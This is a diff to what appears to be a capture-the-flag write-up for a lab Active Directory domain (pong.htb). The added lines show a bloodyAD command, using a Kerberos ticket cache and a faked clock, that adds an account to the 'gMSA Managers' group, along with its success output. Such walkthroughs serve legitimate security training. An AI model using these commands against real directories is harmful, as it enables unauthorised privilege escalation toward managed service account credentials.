@@ -623,7 +623,12 @@ First ill make it into a universal group type
 Now its domain local, and i should be able to add him to the group
 
 ```python
-
+❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'
+[+] S-1-5-21-750635624-2058721901-1932338391-2617 added to CN=gMSA Managers,CN=Users,DC=pong,DC=htb
 ```
+
+Now the user is part of the group!
+
+
 
 
